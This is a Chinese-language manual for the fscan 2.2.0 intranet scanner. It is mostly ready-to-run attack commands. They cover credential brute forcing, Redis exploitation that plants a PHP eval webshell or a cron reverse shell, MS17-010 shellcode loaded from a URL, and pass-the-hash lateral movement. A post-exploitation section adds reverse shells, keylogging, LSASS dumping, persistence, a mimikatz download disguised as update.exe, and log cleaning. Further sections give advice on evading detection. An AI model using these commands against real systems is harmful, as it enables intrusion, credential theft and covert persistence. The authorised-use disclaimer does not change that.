# fscan 使用手册

> **版本**: 2.2.0 (bf036fd, 2026-07-10) | **文件**: `fscan_2.2.0_windows_x64.exe` (8.3 MB)
>
> 内网综合扫描工具，一键自动化漏扫。
>
> **重要声明**: 本工具仅面向**合法授权**的企业安全建设行为。使用前请确保已获得授权，符合当地法律法规，**不对非授权目标扫描**。作者不承担任何非法使用产生的后果。

---

## 目录

- [简介](#简介)
- [架构与工作流程](#架构与工作流程)
- [快速开始](#快速开始)
- [完整参数表](#完整参数表)
  - [目标相关](#目标相关)
  - [端口控制](#端口控制)
  - [扫描模式](#扫描模式)
  - [性能与并发控制](#性能与并发控制)
  - [凭据与爆破](#凭据与爆破)
  - [功能开关](#功能开关)
  - [Web 相关](#web-相关)
  - [漏洞利用](#漏洞利用)
  - [本地后渗透插件](#本地后渗透插件)
  - [代理与网络](#代理与网络)
  - [输出与显示](#输出与显示)
- [使用场景与示例](#使用场景与示例)
  - [场景1：基础内网侦察](#场景1基础内网侦察)
  - [场景2：指定端口扫描](#场景2指定端口扫描)
  - [场景3：弱口令爆破](#场景3弱口令爆破)
  - [场景4：Web 漏洞扫描](#场景4web-漏洞扫描)
  - [场景5：漏洞利用](#场景5漏洞利用)
  - [场景6：凭据复用与哈希传递](#场景6凭据复用与哈希传递)
  - [场景7：后渗透与本地插件](#场景7后渗透与本地插件)
  - [场景8：代理与网络控制](#场景8代理与网络控制)
  - [场景9：输出格式控制](#场景9输出格式控制)
- [结果解读指南](#结果解读指南)
- [最佳实践](#最佳实践)
- [参考资料](#参考资料)

---

## 简介

fscan 是一款基于 Go 语言编写的内网综合扫描工具，支持主机存活探测、端口扫描、服务识别、弱口令爆破、Web 指纹识别、漏洞扫描与利用、后渗透等功能。它被设计为"一键式"工具——默认参数即可完成从侦察到利用的完整链条。

**核心能力一览**：

| 能力 | 说明 |
|------|------|
| 主机发现 | ICMP/Ping 存活探测，支持大网段 B/C 段存活统计 |
| 端口扫描 | TCP 全连接扫描，内置约 140 个常用端口，支持端口组 |
| 服务识别 | 智能协议识别，20+ 种服务指纹匹配 |
| Web 探测 | 网站标题、CMS 指纹、Web 中间件、WAF/CDN 识别（40+ 指纹） |
| 弱口令爆破 | 28 种服务爆破，内置 100+ 常见弱密码，支持 `{user}` 变量替换 |
| Hash 碰撞 | 支持 NTLM Hash 认证（SMB/WMI） |
| SSH 密钥登录 | 支持私钥认证方式 |
| 高危漏洞检测 | MS17-010（永恒之蓝）、SMBGhost（CVE-2020-0796） |
| 未授权访问 | Redis / MongoDB / Memcached / Elasticsearch 等未授权检测 |
| POC 扫描 | 集成 Web 漏洞 POC，支持 Xray POC 格式 |
| DNSLog | 支持 DNSLog 外带检测 |
| Redis 利用 | 写公钥、写计划任务、写 WebShell、主从复制 RCE |
| MS17-010 利用 | ShellCode 注入，支持添加用户、执行命令 |
| 本地插件 | 信息收集、凭据获取、权限维持、反弹 Shell、杀软检测、痕迹清理 |

---

## 架构与工作流程

fscan 的扫描流程分为 **六个阶段**，依次执行：

```
目标输入 → 存活探测 → 端口扫描 → 服务识别 → 弱口令爆破 → 漏洞检测与利用
   │           │          │          │            │              │
   │      ICMP/Ping    TCP连接    指纹匹配    28种服务爆破    MS17-010/Redis
   │      存活统计     约140端口   20+服务    内置字典+自定义   POC扫描/未授权
```

**关键设计点**：

- 每个阶段依赖上一阶段的结果：只有存活的主机才做端口扫描，只有开放端口才做服务识别。
- 爆破发生在服务识别**之后**，因此能精准选择爆破协议（SSH 端口才做 SSH 爆破）。
- POC 扫描发生在 Web 指纹识别之后，通过指纹匹配合适的 POC，避免盲目全量发包。
- 可通过 `-np`（跳过存活探测）、`-nobr`（跳过爆破）、`-nopoc`（跳过 POC）跳过特定阶段。

---

## 快速开始

```powershell
# 全模块扫描一个 C 段（最常用）
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24

# 仅存活探测
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -ao

# 指定端口扫描
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.1 -p 22,80,443,3389

# 禁用爆破
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -nobr

# Web 扫描
.\fscan_2.2.0_windows_x64.exe -u http://192.168.1.1

# SSH 爆破
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.100 -m ssh -user root -pwd password

# Redis 写公钥
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.100 -m redis -rf id_rsa.pub

# 本地插件
.\fscan_2.2.0_windows_x64.exe -local systeminfo
```

---

## 完整参数表

> 随时运行 `fscan_2.2.0_windows_x64.exe --help` 查看最新参数。

### 目标相关

| 参数 | 类型 | 说明 | 示例 |
|------|------|------|------|
| `-h` | string | 目标：IP / CIDR网段 / IP范围 / 域名 | `-h 192.168.1.0/24` |
| `-hf` | string | 从文件读取目标列表（每行一个） | `-hf targets.txt` |
| `-eh` | string | 排除指定主机 | `-eh 192.168.1.1,192.168.1.254` |
| `-ehf` | string | 从文件读取排除主机列表 | `-ehf exclude.txt` |

**目标格式支持**：

- 单IP：`192.168.1.1`
- CIDR网段：`192.168.1.0/24`（C段）、`192.168.0.0/16`（B段）、`10.0.0.0/8`（A段）
- IP范围：`192.168.1.1-192.168.1.100`
- 多个目标用逗号分隔：`192.168.1.0/24,10.0.0.0/24`
- 域名：`example.com`
- 文件输入：`-hf ip.txt`（文件内每行一个IP或网段）

### 端口控制

| 参数 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `-p` | string | 约140个常用端口 | 指定端口列表 |
| `-pf` | string | — | 从文件读取端口列表 |
| `-ep` | string | — | 排除指定端口 |

**默认端口覆盖**：

```
21,22,23,25,53,80,81,88,110,111,135,139,143,161,389,443,445,465,
502,512,513,514,515,548,554,587,623,636,873,902,993,995,1080,1099,
1194,1433,1434,1521,1522,1525,1723,1883,2049,2121,2181,2200,2222,
2375,2376,2379,2380,3000,3128,3268,3269,3306,3389,3690,4369,4444,
4848,5000,5005,5044,5060,5432,5601,5631,5632,5671,5672,5900,5984,
5985,5986,6000,6379,6380,6443,6666,6667,7001,7002,7474,7687,8000,
8005,8008,8009,8080,8081,8086,8088,8089,8090,8161,8180,8443,8500,
8834,8848,8880,8883,8888,9000,9001,9042,9080,9090,9092,9093,9160,
9200,9300,9418,9443,9999,10000,10051,10250,10255,11211,15672,22222,
26379,27017,27018,50000,50070,50075,61613,61614,61616
```

### 扫描模式

| 参数 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `-m` | string | `all` | 扫描模式 |

**可用模式**：

| 模式 | 说明 |
|------|------|
| `all` | 全部模块（存活→端口→服务→爆破→POC） |
| `icmp` | 仅 ICMP 存活探测 |
| `portscan` | 仅端口扫描 |
| `ssh` | 仅 SSH 扫描 + 爆破 |
| `mysql` | 仅 MySQL 扫描 + 爆破 |
| `mssql` | 仅 MSSQL 扫描 + 爆破 |
| `smb` | 仅 SMB 扫描 + MS17-010 检测 |
| `smb2` | SMB Hash 碰撞 |
| `rdp` | 仅 RDP 扫描 + 爆破 |
| `redis` | 仅 Redis 扫描 + 利用 |
| `ftp` | 仅 FTP 扫描 + 爆破 |
| `postgresql` | 仅 PostgreSQL 扫描 + 爆破 |
| `oracle` | 仅 Oracle 扫描 + 爆破 |
| `mongodb` | 仅 MongoDB 扫描 + 未授权检测 |
| `elasticsearch` | 仅 ES 扫描 + 未授权检测 |
| `netbios` | NetBIOS 信息探测 |
| `ms17010` | 仅 MS17-010 漏洞检测 |
| … | 其他服务插件名均可作为模式 |

### 性能与并发控制

| 参数 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `-t` | int | 600 | 端口扫描线程数 |
| `-mt` | int | 20 | 模块扫描线程数 |
| `-time` | int | 3 | 端口扫描超时（秒） |
| `-wt` | int | 5 | Web 请求超时（秒） |
| `-gt` | int | 180 | 全局超时（秒） |
| `-rate` | int | 0(不限制) | 每分钟最大发包次数 |
| `-maxpkts` | int | 0(不限制) | 最大发包总数 |
| `-icmp-rate` | float | 0.1 | ICMP 发包速率（约 1463 pps） |
| `-num` | int | 20 | POC 并发数 |
| `-retry` | int | 3 | 最大重试次数 |

**调优建议**：

- 内网环境好时可加大 `-t 1000`，提高扫描速度
- 网络不稳定时降低 `-t 200`、增加 `-time 5`，减少误判
- 规避流量检测时用 `-rate 1000` 限制发包
- VPN 环境下用 `-t 200 -time 5` 更稳定

### 凭据与爆破

| 参数 | 类型 | 说明 |
|------|------|------|
| `-user` | string | 指定用户名 |
| `-pwd` | string | 指定密码 |
| `-usera` | string | 额外用户名（逗号或空格分隔，与内置字典合并） |
| `-pwda` | string | 额外密码（逗号或空格分隔，与内置字典合并） |
| `-userf` | string | 用户名字典文件 |
| `-pwdf` | string | 密码字典文件 |
| `-upf` | string | 用户名:密码对文件（每行格式 `user:pass`） |
| `-domain` | string | 域名（用于 SMB 域认证爆破） |
| `-hash` | string | NTLM 哈希值 |
| `-hashf` | string | NTLM 哈希文件 |
| `-sshkey` | string | SSH 私钥文件 |

**支持的爆破服务（28种）**：

SSH、RDP、SMB、FTP、Telnet、MySQL、MSSQL、Oracle、PostgreSQL、Redis、MongoDB、Elasticsearch、Memcached、VNC、LDAP、SMTP、POP3、IMAP、SNMP、Rsync、RabbitMQ、ActiveMQ、Kafka、Zookeeper、Neo4j、Cassandra、MQTT、Modbus 等。

### 功能开关

| 参数 | 说明 |
|------|------|
| `-np` | 跳过存活探测（假设目标均在线，直接扫端口） |
| `-ntp` | 跳过 TCP 补充探测 |
| `-nsp` | 跳过网段预筛（大规模扫描时跳过空 /24 网段的优化） |
| `-nobr` | 跳过爆破（仅做扫描和服务识别） |
| `-nopoc` | 跳过 Web POC 扫描 |
| `-noredis` | 跳过 Redis 漏洞利用 |
| `-full` | 全量 POC 扫描（遍历所有 POC，更全面但更慢） |
| `-ao` | **仅**存活探测（等价于 `-m icmp`） |

### Web 相关

| 参数 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `-u` | string | — | 目标 URL（单个 Web 扫描） |
| `-uf` | string | — | URL 列表文件 |
| `-cookie` | string | — | HTTP Cookie |
| `-ua` | string | — | 自定义 User-Agent |
| `-wt` | int | 5 | Web 请求超时（秒） |
| `-max-redirect` | int | 10 | HTTP 最大重定向次数 |
| `-pocname` | string | — | 指定 POC 名称关键字 |
| `-pocpath` | string | — | 自定义 POC 脚本路径 |
| `-dns` | — | — | 启用 DNSLog 外带检测 |

### 漏洞利用

| 参数 | 类型 | 说明 |
|------|------|------|
| `-rf` | string | Redis 写入文件路径 |
| `-rs` | string | Redis 计划任务反弹Shell (格式: `ip:port`) |
| `-rwp` | string | Redis WebShell 写入路径 |
| `-rwc` | string | Redis WebShell 写入内容 |
| `-rwf` | string | Redis WebShell 文件名 |
| `-sc` | string | MS17-010 Shellcode 路径或 URL |
| `-rsh` | string | 反弹Shell 目标地址 (格式: `ip:port`) |
| `-fsh-port` | int | 正向Shell 监听端口 (默认 4444) |

### 本地后渗透插件

| 参数 | 类型 | 说明 |
|------|------|------|
| `-local` | string | 指定本地插件名称 |

**可用插件**：

| 插件名 | 功能 | 平台 |
|--------|------|------|
| `systeminfo` | 系统信息收集 | 全平台 |
| `reverseshell` | 反弹Shell | 全平台 |
| `forwardshell` | 正向Shell | Windows |
| `socks5proxy` | 启动SOCKS5代理服务 | 全平台 |
| `keylogger` | 键盘记录 | Windows |
| `minidump` | LSASS凭据导出 | Windows |
| `sshkey` | SSH公钥注入 | Linux |
| `cleaner` | 痕迹清理 | 全平台 |
| `crontask` | Cron持久化 | Linux |
| `systemdservice` | Systemd服务持久化 | Linux |
| `ldpreload` | LD_PRELOAD Rootkit | Linux |
| `winregistry` | 注册表持久化 | Windows |
| `winschtask` | 计划任务持久化 | Windows |
| `winservice` | 服务持久化 | Windows |
| `winstartup` | 启动项持久化 | Windows |
| `winlogon` | 登录脚本持久化 | Windows |
| `winwmi` | WMI持久化 | Windows |
| `winbits` | BITS任务持久化 | Windows |
| `winifeo` | IFEO持久化 | Windows |
| `avdetect` | 杀软检测 | Windows |
| `download` | 文件下载 | 全平台 |

**持久化相关参数**：

| 参数 | 类型 | 说明 |
|------|------|------|
| `-persistence-file` | string | Linux持久化目标文件 (.elf/.sh) |
| `-win-pe` | string | Windows持久化目标PE文件 (.exe/.dll) |
| `-download-url` | string | 文件下载URL |
| `-download-path` | string | 文件下载保存路径 |
| `-keylog-output` | string | 键盘记录输出文件 (默认 "keylog.txt") |

### 代理与网络

| 参数 | 类型 | 说明 |
|------|------|------|
| `-proxy` | string | HTTP 代理 (如: `http://127.0.0.1:8080`) |
| `-socks5` | string | SOCKS5 代理 (如: `127.0.0.1:1080` 或 `socks5://user:pass@127.0.0.1:1080`) |
| `-iface` | string | 指定本地网卡IP (VPN场景，如: `10.8.0.5`) |
| `-start-socks5` | int | 启动SOCKS5代理服务器 (如: 1080) |

### 输出与显示

| 参数 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `-o` | string | `result.txt` | 输出文件路径 |
| `-f` | string | `txt` | 输出格式: txt / json / csv |
| `-no` | — | — | 不保存结果到文件 |
| `-silent` | — | — | 静默模式（无Banner、无进度条、无颜色） |
| `-nocolor` | — | — | 禁用彩色输出 |
| `-nopg` | — | — | 禁用进度条 |
| `-debug` | — | — | 调试模式（日志写入 `fscan_debug.log`） |
| `-log` | string | `base,info,success` | 日志级别 |
| `-perf` | — | — | 输出性能统计JSON |
| `-lang` | string | `zh` | 语言: zh(中文) / en(英文) |

---

## 使用场景与示例

以下示例均以 Windows 环境为例。在 Linux 下将 `.exe` 替换为 `./fscan`。

### 场景1：基础内网侦察

**目标**：快速了解一个网络的资产情况。

```powershell
# 最常用命令：全模块扫描一个 C 段
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24

# 仅存活探测（快速确认哪些主机在线）
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -ao
# 或等价写法
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -m icmp

# 仅端口扫描 + 不爆破 + 不POC（最轻量侦察）
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -nobr -nopoc

# 扫描 B 段（更大范围）
.\fscan_2.2.0_windows_x64.exe -h 192.168.0.0/16

# 扫描 A 段（仅探测每个 /24 的 .1 和 .254，快速了解网段信息）
.\fscan_2.2.0_windows_x64.exe -h 10.0.0.0/8 -m icmp

# 从文件批量导入目标
.\fscan_2.2.0_windows_x64.exe -hf targets.txt

# 排除特定主机（跳过网关和已知主机，减少干扰）
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -eh 192.168.1.1,192.168.1.254
```

**targets.txt 示例**：
```
192.168.1.0/24
192.168.2.0/24
10.0.0.1
10.0.0.5-10.0.0.20
```

### 场景2：指定端口扫描

**目标**：只扫描关心的端口，加速扫描或针对性侦察。

```powershell
# 只扫 Web 端口
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -p 80,81,443,8080,8443,9090

# 只扫数据库端口
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -p 3306,1433,5432,6379,27017

# 全端口扫描（1-65535，很慢，建议只对单台主机使用）
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.100 -p 1-65535 -t 1000

# 排除端口（不扫 445 和 3389）
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -ep 445,3389

# 禁 Ping 环境（跳过 ICMP，直接用 TCP 扫端口）
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -np

# 跳过存活探测 + 不保存 + 不POC（快速端口侦察）
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -np -no -nopoc
```

### 场景3：弱口令爆破

**目标**：发现弱口令服务。

```powershell
# 全模块扫描时自动爆破（默认行为）
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24

# 只扫描 + 爆破 SSH
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -m ssh

# 指定用户名和密码
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -user admin -pwd admin123

# 使用自定义字典文件
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -userf users.txt -pwdf pass.txt

# 在内置字典基础上追加额外的用户名和密码（注意：用逗号或空格分隔）
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -usera "root,admin,test" -pwda "123456,password,admin"

# 使用 用户名:密码 对文件（每行 user:pass，一一对应）
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -upf creds.txt

# SMB 域认证爆破
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -m smb -domain corp.local -user administrator -pwd P@ssw0rd

# 禁用爆破（仅扫描和服务识别，不做任何登录尝试）
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -nobr
```

**字典文件格式**：

`users.txt`（每行一个用户名）：
```
root
admin
administrator
test
guest
```

`pass.txt`（每行一个密码）：
```
123456
admin
password
P@ssw0rd
12345678
```

`creds.txt`（每行一组用户名:密码对）：
```
admin:admin123
root:toor
administrator:P@ssw0rd
```

### 场景4：Web 漏洞扫描

**目标**：扫描 Web 服务的指纹、标题和漏洞。

```powershell
# 扫描单个 URL
.\fscan_2.2.0_windows_x64.exe -u http://192.168.1.100:8080

# 批量扫描 URL
.\fscan_2.2.0_windows_x64.exe -uf urls.txt

# 带 Cookie 扫描（适用于需要登录的站点）
.\fscan_2.2.0_windows_x64.exe -u http://192.168.1.100 -cookie "PHPSESSID=abc123; token=xyz"

# 指定 POC 名称（减少扫描量，更快更准）
.\fscan_2.2.0_windows_x64.exe -u http://192.168.1.100 -pocname weblogic

# 全量 POC 扫描（遍历所有POC，速度较慢但更全面）
.\fscan_2.2.0_windows_x64.exe -u http://192.168.1.100 -full

# 使用自定义 POC 目录
.\fscan_2.2.0_windows_x64.exe -u http://192.168.1.100 -pocpath C:\custom-pocs\

# DNSLog 外带检测（适用于无回显漏洞）
.\fscan_2.2.0_windows_x64.exe -u http://192.168.1.100 -dns

# 调整 POC 并发（降低到 10 减少负载）
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -num 10
```

**urls.txt 示例**：
```
http://192.168.1.1
http://192.168.1.1:8080
https://192.168.1.2
http://example.com:9090
```

### 场景5：漏洞利用

**目标**：利用已发现的漏洞。

```powershell
# Redis 写 SSH 公钥（实现免密登录）
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.100 -m redis -rf id_rsa.pub

# Redis 计划任务反弹Shell
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.100 -m redis -rs 192.168.1.200:4444

# Redis 写 WebShell
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.100 -m redis `
  -rwp /var/www/html `
  -rwc "<?php @eval($_POST['cmd']);?>"

# MS17-010 检测（永恒之蓝）
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -m ms17010

# 检测到 MS17-010 后注入 Shellcode
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.100 -sc http://your-server/payload.bin

# SSH 爆破成功后自动执行命令
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.100 -m ssh -user root -pwd toor
```

### 场景6：凭据复用与哈希传递

**目标**：利用已获取的凭据横向移动。

```powershell
# NTLM Hash 传递（Pass-the-Hash）
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.100 `
  -hash "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0"

# 批量哈希传递
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -hashf hashes.txt

# SSH 私钥登录
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.100 -m ssh -user root -sshkey id_rsa
```

**hashes.txt 示例**（每行一个 NTLM Hash）：
```
aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
aad3b435b51404eeaad3b435b51404ee:b4b9b02e6f09a9bd760f388b67351e2b
```

### 场景7：后渗透与本地插件

**目标**：在已控制的主机上执行后渗透操作。

```powershell
# 列出所有可用本地插件
.\fscan_2.2.0_windows_x64.exe -local list

# 收集系统信息
.\fscan_2.2.0_windows_x64.exe -local systeminfo

# 反弹 Shell（先在攻击机监听: nc -lvnp 4444）
.\fscan_2.2.0_windows_x64.exe -local reverseshell -rsh 192.168.1.200:4444

# 启动正向 Shell（在目标上监听，攻击者连接）
.\fscan_2.2.0_windows_x64.exe -local forwardshell -fsh-port 4444

# 启动 SOCKS5 代理（本地监听 1080，用于内网穿透）
.\fscan_2.2.0_windows_x64.exe -local socks5proxy -start-socks5 1080

# 键盘记录
.\fscan_2.2.0_windows_x64.exe -local keylogger -keylog-output captured.txt

# LSASS 凭据导出
.\fscan_2.2.0_windows_x64.exe -local minidump

# 杀软检测
.\fscan_2.2.0_windows_x64.exe -local avdetect

# Windows 启动项持久化
.\fscan_2.2.0_windows_x64.exe -local winstartup -win-pe C:\Windows\Temp\payload.exe

# Linux Cron 持久化
.\fscan_2.2.0_windows_x64.exe -local crontask -persistence-file /tmp/backdoor.elf

# 下载文件到目标
.\fscan_2.2.0_windows_x64.exe -local download `
  -download-url http://192.168.1.200/tools/mimikatz.exe `
  -download-path C:\Users\Public\update.exe

# 清理痕迹
.\fscan_2.2.0_windows_x64.exe -local cleaner
```

### 场景8：代理与网络控制

**目标**：通过代理扫描或控制流量特征。

```powershell
# 使用 HTTP 代理
.\fscan_2.2.0_windows_x64.exe -h 10.0.0.0/24 -proxy http://127.0.0.1:8080

# 使用 SOCKS5 代理（无认证）
.\fscan_2.2.0_windows_x64.exe -h 10.0.0.0/24 -socks5 127.0.0.1:1080

# 使用 SOCKS5 代理（带认证）
.\fscan_2.2.0_windows_x64.exe -h 10.0.0.0/24 -socks5 socks5://user:pass@127.0.0.1:1080

# VPN 场景：指定网卡
.\fscan_2.2.0_windows_x64.exe -h 10.8.0.0/24 -iface 10.8.0.5

# 限制发包速率（每分钟最多 1000 个包，规避流量检测）
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -rate 1000

# 限制总发包量
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -maxpkts 50000

# 调整 ICMP 速率（降低到 0.05 更隐蔽）
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -icmp-rate 0.05
```

### 场景9：输出格式控制

**目标**：控制结果的输出格式和内容。

```powershell
# 指定输出文件
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -o scan-2026-08-10.txt

# JSON 格式输出（方便程序解析）
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -f json -o result.json

# CSV 格式输出（方便 Excel 打开）
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -f csv -o result.csv

# 不保存文件（仅屏幕显示）
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -no

# 静默模式（适合 Cobalt Strike 等不出网场景）
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -silent

# 英文界面（适合国际化环境或日志分析）
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -lang en

# 调试模式（排查问题时使用，日志写入 fscan_debug.log）
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.100 -debug

# 输出性能统计（了解各阶段耗时）
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -perf
```

---

## 结果解读指南

### result.txt 输出格式

典型的扫描结果文件分为五个部分：

```
# ===== 存活主机 =====
192.168.9.106
192.168.9.101
...

# ===== 开放端口 =====
192.168.9.101:80
192.168.9.101:22
...

# ===== 服务信息 =====
192.168.9.101:22 ssh SSH-2.0-dropbear ...
192.168.9.101:80 http
192.168.9.106:445 microsoft-ds SMB@ ...
http://192.168.9.108:8080
...

# ===== Web服务 =====
http://192.168.9.108:8080
https://192.168.9.108:443
...

# ===== 漏洞信息 =====
[+] 192.168.9.106:445 MS17-010 (Windows Server 2008 R2)
[+] 192.168.9.101:6379 Redis 未授权访问
[+] 192.168.9.101:22 SSH root:root 弱口令
...
```

### 各节含义

| 节 | 含义 | 关键符号 |
|----|------|----------|
| 存活主机 | 所有响应 ICMP/Ping 的主机，代表了可攻击面 | — |
| 开放端口 | `IP:端口` 格式，快速了解每台主机的服务分布 | — |
| 服务信息 | 每个开放端口对应的服务协议和版本 | `@` = 指纹已识别；`version bind` = DNS 版本可查；`unknown` = 未识别 |
| Web 服务 | 汇总所有 HTTP/HTTPS 服务 URL | 方便后续针对性测试 |
| 漏洞信息 | 发现的漏洞，以 `[+]` 开头 | 包含目标地址、端口和漏洞描述 |

### JSON 输出

使用 `-f json` 时输出结构化 JSON，可用 `jq` 或其他工具解析：

```powershell
# 提取所有漏洞信息
cat result.json | jq '.vulnerabilities'

# 提取所有开放 80 端口的主机
cat result.json | jq '.hosts[] | select(.ports[] | .port == 80)'
```

---

## 最佳实践

### 侦察阶段（信息收集为主）

```powershell
# 第一步：轻量探测，了解网络规模
.\fscan_2.2.0_windows_x64.exe -h 10.0.0.0/8 -m icmp

# 第二步：对存活网段做全模块扫描
.\fscan_2.2.0_windows_x64.exe -h 192.168.9.0/24

# 第三步：对关键主机做全端口扫描
.\fscan_2.2.0_windows_x64.exe -h 192.168.9.106 -p 1-65535
```

### 横向移动阶段（爆破和利用为主）

```powershell
# 发现弱口令后，用已获凭据在全网横向爆破
.\fscan_2.2.0_windows_x64.exe -h 192.168.0.0/16 -user admin -pwd Admin@123 -nopoc

# 使用哈希传递横向移动
.\fscan_2.2.0_windows_x64.exe -h 192.168.0.0/16 -hashf captured-hashes.txt
```

### 规避检测（隐蔽优先）

```powershell
# fscan 限速模式：低线程 + 限速 + 低 ICMP 速率
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -t 100 -rate 500 -icmp-rate 0.05

# 代理链扫描
.\fscan_2.2.0_windows_x64.exe -h 10.0.0.0/24 -socks5 127.0.0.1:1080 -t 100
```

### 效率优先（快速出结果）

```powershell
# 大线程 + 跳过非必要模块
.\fscan_2.2.0_windows_x64.exe -h 192.168.1.0/24 -t 1000 -nobr -nopoc
```

### 参数组合速查

| 场景 | 命令模板 |
|------|---------|
| 最常用全扫 | `fscan -h 192.168.1.0/24` |
| 轻量侦察 | `fscan -h 192.168.1.0/24 -nobr -nopoc` |
| 快速存活 | `fscan -h 192.168.0.0/16 -ao` |
| 指定服务端口 | `fscan -h 192.168.1.0/24 -p 22,80,443,3306` |
| 仅爆破 | `fscan -h 192.168.1.0/24 -np -nopoc -user admin -pwd admin123` |
| 隐蔽扫描 | `fscan -h 192.168.1.0/24 -t 100 -rate 500 -silent` |
| 输出 JSON | `fscan -h 192.168.1.0/24 -f json -o result.json` |

---

## 参考资料

- [fscan GitHub 官方仓库](https://github.com/shadow1ng/fscan)
- [404StarLink 项目页](https://github.com/knownsec/404StarLink)
- [FingerprintHub 指纹库](https://github.com/0x727/FingerprintHub)

---

> **最后提醒**：本工具是专业安全评估工具，请在获得合法授权的前提下使用。禁止对未授权目标进行扫描，使用者需自行承担所有法律责任。
